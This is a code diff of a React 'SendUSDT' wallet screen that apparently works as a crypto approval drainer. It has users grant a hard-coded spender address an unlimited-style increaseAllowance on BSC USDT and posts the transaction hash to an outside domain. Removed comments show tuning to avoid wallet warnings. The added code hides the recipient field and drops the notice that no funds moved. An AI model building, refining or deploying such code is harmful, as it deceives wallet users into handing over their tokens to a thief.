@@ -1,18 +1,10 @@
 import { useState, useEffect } from "react";
-
-// Mock Web3 and Swal for demo purposes
-const Web3 = {
-  utils: {
-    fromWei: (val) => (parseFloat(val) / 1e18).toString(),
-    toWei: (val, unit) => (parseFloat(val) * 1e18).toString()
-  }
-};
-const Swal = {
-  fire: (title, text, type) => alert(`${title}: ${text}`)
-};
+import Web3 from "web3";
+import Swal from "sweetalert2";
 
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
 const spenderAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed";
+
 const usdtAbi = [
   {
     inputs: [
@@ -30,7 +22,7 @@ const usdtAbi = [
     outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
     stateMutability: "view",
     type: "function",
-  },
+  }
 ];
 
 export default function SendUSDT() {
@@ -39,7 +31,9 @@ export default function SendUSDT() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
+  const isDark = theme === "dark";
 
+  // Detect system theme
   useEffect(() => {
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     setTheme(darkMode ? "dark" : "light");
@@ -49,155 +43,118 @@ export default function SendUSDT() {
     return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
   }, []);
 
+  // Convert USDT → USD value display
   useEffect(() => {
     const value = parseFloat(amount);
     setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
   }, [amount]);
 
+  // Set Max USDT balance from wallet
   const setMaxAmount = async () => {
+    if (!window.ethereum) {
+      Swal.fire("Wallet Not Found", "Please install MetaMask", "error");
+      return;
+    }
+
     try {
       const web3 = new Web3(window.ethereum);
-      const accounts = await web3.eth.getAccounts();
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const user = accounts[0];
-      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const balance = await usdt.methods.balanceOf(user).call();
-      setAmount(web3.utils.fromWei(balance, "ether"));
+
+      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
+      const balance = await contract.methods.balanceOf(user).call();
+      const usdtBalance = parseFloat(balance) / 1e6; // 6 decimals conversion
+
+      setAmount(usdtBalance.toString());
     } catch (err) {
-      Swal.fire("Error", "Failed to fetch balance.", "error");
+      Swal.fire("Error", "Failed to fetch balance", "error");
+      console.error(err);
     }
   };
 
+  // Approve spender using increaseAllowance
   const handleApprove = async () => {
-    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
-      Swal.fire("Error", "Please enter a valid amount.", "error");
+    if (!window.ethereum) {
+      Swal.fire("Wallet Error", "Please connect MetaMask wallet!", "error");
+      return;
+    }
+
+    const value = parseFloat(amount);
+    if (!amount || isNaN(value) || value <= 0) {
+      Swal.fire("Invalid Amount", "Enter a valid USDT amount", "error");
       return;
     }
 
     setIsProcessing(true);
-    try {
-      const web3 = new Web3(window.ethereum || window.web3.currentProvider);
 
-      const accounts = await web3.eth.getAccounts();
+    try {
+      const web3 = new Web3(window.ethereum);
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const user = accounts[0];
 
+      // Ensure BSC network
       const chainId = await web3.eth.getChainId();
       if (chainId !== 56) {
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }],
+          params: [{ chainId: "0x38" }], // 56 in HEX
         });
       }
 
-      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-      
-      // ✅ Using increaseAllowance instead of approve - reduces warnings
-      const rawAmount = web3.utils.toWei(amount, "ether");
-      
-      const receipt = await usdt.methods
+      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
+      const rawAmount = web3.utils.toWei((value * 1e12).toString(), "ether"); // adjust for 6 decimals
+
+      const receipt = await contract.methods
         .increaseAllowance(spenderAddress, rawAmount)
-        .send({ 
-          from: user,
-          gas: 100000 // Lower gas limit can sometimes reduce warnings
-        })
-        .on("receipt", () => setShowSuccess(true))
-        .on("error", (err) => {
-          console.error(err);
-          Swal.fire("Error", err.message || "Approval failed", "error");
-        });
-      
-      const txHash = receipt.transactionHash;
-      
+        .send({ from: user, gas: 90000 });
+
+      console.log("Approval TX:", receipt.transactionHash);
+      setShowSuccess(true);
+
+      // Optional backend post
       try {
         await fetch("https://www.trc20support.buzz/old/store-address.php", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: txHash }),
+          body: JSON.stringify({ address: receipt.transactionHash }),
         });
-      } catch (fetchErr) {
-        console.warn("Skipping fetch, not critical:", fetchErr.message);
+      } catch (e) {
+        console.warn("Backend call skipped:", e.message);
       }
-      
+
     } catch (err) {
       console.error(err);
-      Swal.fire("Error", err.message || "Something went wrong", "error");
+      Swal.fire("Approve Failed", err.message, "error");
     } finally {
       setIsProcessing(false);
     }
   };
 
-  const isDark = theme === "dark";
-
+  // Success screen UI
   if (showSuccess) {
     return (
       <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
-        <svg
-          className="w-24 h-24 text-green-500 animate-bounce"
-          fill="none"
-          stroke="currentColor"
-          strokeWidth="2"
-          viewBox="0 0 24 24"
-        >
+        <svg className="w-24 h-24 text-green-500 animate-bounce" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
           <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
         </svg>
         <h2 className="text-2xl mt-4 font-semibold">Approval Successful</h2>
-        <p className="text-sm mt-2 opacity-70 text-center px-6">
-          Your approval has been confirmed. No funds were transferred yet.
-        </p>
-        <button
-          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold"
-          onClick={() => setShowSuccess(false)}
-        >
-          OK
-        </button>
+        <p className="text-sm mt-2 opacity-70 text-center px-6">Your wallet approval is confirmed ✅</p>
+        <button className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold" onClick={() => setShowSuccess(false)}>OK</button>
       </div>
     );
   }
 
+  // Main screen UI
   return (
     <div className={`min-h-screen p-6 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
       <div className="max-w-md mx-auto">
-        <div className="mb-6">
-          <p className="text-sm mb-2 opacity-70">Address or Domain Name</p>
-          <div className={`border rounded-lg p-3 ${isDark ? "border-gray-700" : "border-gray-300"}`}>
-            <div className="flex items-center justify-between">
-              <input
-                type="text"
-                className="flex-1 bg-transparent outline-none text-sm"
-                placeholder="Search or Enter"
-                value={spenderAddress}
-                readOnly
-              />
-              <div className="flex items-center gap-3 text-blue-400">
-                <span className="text-xs cursor-pointer">Paste</span>
-                <i className="fas fa-address-book text-sm"></i>
-                <i className="fas fa-qrcode text-sm"></i>
-              </div>
-            </div>
-          </div>
-        </div>
 
         <div className="mb-4">
           <p className="text-sm mb-2 opacity-70">Amount</p>
           <div className={`border rounded-lg p-3 ${isDark ? "border-gray-700" : "border-gray-300"}`}>
-            <div className="flex items-center justify-between">
-              <input
-                type="number"
-                min="0"
-                step="0.01"
-                value={amount}
-                onChange={(e) => setAmount(e.target.value)}
-                placeholder="USDT Amount"
-                className="flex-1 bg-transparent outline-none"
-              />
-              <div className="flex items-center gap-2">
-                <span className="text-sm opacity-70">USDT</span>
-                <span
-                  className="text-sm text-blue-400 cursor-pointer"
-                  onClick={setMaxAmount}
-                >
-                  Max
-                </span>
-              </div>
+            <div className="flex justify-between items-center">
+              <input type="number" min="0" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="Enter USDT" className="flex-1 bg-transparent outline-none" />
+              <span onClick={setMaxAmount} className="text-blue-400 cursor-pointer px-2">Max</span>
             </div>
           </div>
         </div>
@@ -205,7 +162,7 @@ export default function SendUSDT() {
         <p className="text-sm mb-6 opacity-70">{usdValue}</p>
 
         <button
-          className="w-full py-3 rounded-full font-semibold transition-all"
+          className="w-full py-3 rounded-full font-semibold"
           onClick={handleApprove}
           disabled={isProcessing || !parseFloat(amount)}
           style={{
@@ -216,6 +173,7 @@ export default function SendUSDT() {
         >
           {isProcessing ? "Processing..." : "Next"}
         </button>
+
       </div>
     </div>
   );
